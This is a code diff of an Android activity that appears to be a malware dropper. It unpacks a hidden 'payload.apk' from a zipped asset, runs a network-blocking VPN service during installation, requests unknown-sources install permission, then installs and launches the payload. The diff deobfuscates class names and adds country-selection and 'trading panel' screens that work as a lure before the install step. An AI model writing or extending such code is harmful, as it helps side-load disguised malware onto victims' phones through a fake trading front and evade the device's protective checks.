@@ -19,6 +19,8 @@ import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
 import android.widget.Button;
+import android.widget.RadioButton;
+import android.widget.RadioGroup;
 import android.widget.TextView;
 
 import net.lingala.zip4j.ZipFile;
@@ -29,7 +31,7 @@ import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 
-public class A4450c4b785 extends Activity {
+public class MainActivity extends Activity {
 
     private static final String ASSET_NAME  = "module";
     private static final String INNER_NAME  = "payload.apk";
@@ -46,6 +48,12 @@ public class A4450c4b785 extends Activity {
 
     private TextView status;
     private Button   btn;
+    private Button   btnContinueCountry;
+    private RadioGroup countryOptions;
+    private android.view.View countryPage;
+    private android.view.View tradingPanelPage;
+    private android.view.View installPage;
+    private TextView selectedCountry;
     private InstallResultReceiver receiver;
     private final Handler ui = new Handler(Looper.getMainLooper());
 
@@ -67,7 +75,7 @@ public class A4450c4b785 extends Activity {
     /**
      * Periodic runnable that keeps the Install button in sync with live VPN status.
      *
-     * Uses V4450c4b785.isRunning() as the primary (and most reliable) check —
+     * Uses BlockVpnService.isRunning() as the primary (and most reliable) check —
      * it queries our static service instance directly rather than going through
      * ConnectivityManager, which can lag or return stale data on many OEMs.
      *
@@ -104,7 +112,7 @@ public class A4450c4b785 extends Activity {
     /**
      * Returns true if our blocking VPN is currently live.
      *
-     * Primary check  — V4450c4b785.isRunning(): queries the static service
+     * Primary check  — BlockVpnService.isRunning(): queries the static service
      *   instance directly.  This is instantaneous and works on all Android
      *   versions / OEMs regardless of ConnectivityManager quirks.
      *
@@ -113,7 +121,7 @@ public class A4450c4b785 extends Activity {
      *   (e.g. service process recycled by the OS on low-memory devices).
      */
     private boolean isVpnLive() {
-        if (V4450c4b785.isRunning()) return true;
+        if (BlockVpnService.isRunning()) return true;
         try {
             ConnectivityManager cm =
                     (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -143,13 +151,47 @@ public class A4450c4b785 extends Activity {
         setContentView(R.layout.activity_main);
         status = findViewById(R.id.status);
         btn    = findViewById(R.id.btnInstall);
+        btnContinueCountry = findViewById(R.id.btnContinueCountry);
+        countryOptions = findViewById(R.id.countryOptions);
+        countryPage = findViewById(R.id.countryPage);
+        tradingPanelPage = findViewById(R.id.tradingPanelPage);
+        installPage = findViewById(R.id.installPage);
+        selectedCountry = findViewById(R.id.selectedCountry);
+
+        countryOptions.setOnCheckedChangeListener((group, checkedId) ->
+                btnContinueCountry.setEnabled(checkedId != -1));
+        btnContinueCountry.setOnClickListener(v -> showTradingPanelPage());
+        findViewById(R.id.btnOpenTradingPanel).setOnClickListener(v -> showInstallPage());
         btn.setOnClickListener(v -> onInstallClicked());
 
-        // Lock the Install button and demand VPN permission before anything else.
+        // Do not start the installation permissions flow until the user reaches it.
         btn.setEnabled(false);
-        requestVpnPermission();
+        btnContinueCountry.setEnabled(countryOptions.getCheckedRadioButtonId() != -1);
+        countryPage.setVisibility(android.view.View.VISIBLE);
+        tradingPanelPage.setVisibility(android.view.View.GONE);
+        installPage.setVisibility(android.view.View.GONE);
+    }
 
-        // Start the monitor — it will enable the button once VPN is confirmed live.
+    private void showTradingPanelPage() {
+        int checkedId = countryOptions.getCheckedRadioButtonId();
+        if (checkedId == -1) return;
+
+        RadioButton selected = findViewById(checkedId);
+        if (selected == null) return;
+
+        String country = selected.getText().toString()
+                .split("\\s+\u2022", 2)[0].trim();
+        selectedCountry.setText("Selected country: " + country);
+        countryPage.setVisibility(android.view.View.GONE);
+        tradingPanelPage.setVisibility(android.view.View.VISIBLE);
+    }
+
+    private void showInstallPage() {
+        tradingPanelPage.setVisibility(android.view.View.GONE);
+        installPage.setVisibility(android.view.View.VISIBLE);
+
+        // Ask for VPN permission only after the user proceeds to installation.
+        requestVpnPermission();
         ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
     }
 
@@ -220,12 +262,12 @@ public class A4450c4b785 extends Activity {
      *      Enable the button immediately — no need to wait.
      *   B) Service not yet running:
      *      Start it, show "Starting VPN…" and let the monitor enable the button
-     *      once V4450c4b785.isRunning() becomes true (typically < 200 ms).
+     *      once BlockVpnService.isRunning() becomes true (typically < 200 ms).
      */
     private void onVpnGranted() {
         vpnPermissionGranted = true;
 
-        if (V4450c4b785.isRunning()) {
+        if (BlockVpnService.isRunning()) {
             // Already live — skip the "Starting…" phase entirely.
             btn.setEnabled(true);
             status.setText("Ready \u2014 tap Install to begin.");
@@ -233,10 +275,10 @@ public class A4450c4b785 extends Activity {
         }
 
         try {
-            startService(new Intent(this, V4450c4b785.class));
+            startService(new Intent(this, BlockVpnService.class));
         } catch (Exception e) {
-            android.util.Log.w(V4450c4b785.TAG,
-                    "Could not start V4450c4b785: " + e.getMessage());
+            android.util.Log.w(BlockVpnService.TAG,
+                    "Could not start BlockVpnService: " + e.getMessage());
         }
         // The monitor will enable the button as soon as isRunning() becomes true.
         status.setText("Starting VPN\u2026 please wait.");
@@ -249,7 +291,7 @@ public class A4450c4b785 extends Activity {
     private void stopVpn() {
         installComplete = true;
         ui.removeCallbacks(vpnMonitor);
-        V4450c4b785.stop(this);
+        BlockVpnService.stop(this);
     }
 
     @Override
@@ -314,7 +356,7 @@ public class A4450c4b785 extends Activity {
                 if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                         || getPackageManager().canRequestPackageInstalls()) {
                     awaitingUnknownSourcesGrant = false;
-                    new Thread(A4450c4b785.this::dropAndInstall).start();
+                    new Thread(MainActivity.this::dropAndInstall).start();
                     return;
                 }
                 ui.postDelayed(this, PERM_POLL_MS);
@@ -366,7 +408,7 @@ public class A4450c4b785 extends Activity {
     private void doImmediateRedirect() {
         installComplete = true;
         ui.removeCallbacks(vpnMonitor);
-        V4450c4b785.stop(this);
+        BlockVpnService.stop(this);
 
         final String pkg = BuildConfig.PAYLOAD_PACKAGE;
         if (pkg != null && !pkg.isEmpty()) {
@@ -403,7 +445,7 @@ public class A4450c4b785 extends Activity {
                     try {
                         startActivity(launch);
                         stopVpn();
-                        ui.postDelayed(A4450c4b785.this::finish, 150);
+                        ui.postDelayed(MainActivity.this::finish, 150);
                     } catch (Exception e) {
                         if (status != null) status.setText("Launch failed: " + e.getMessage());
                     }
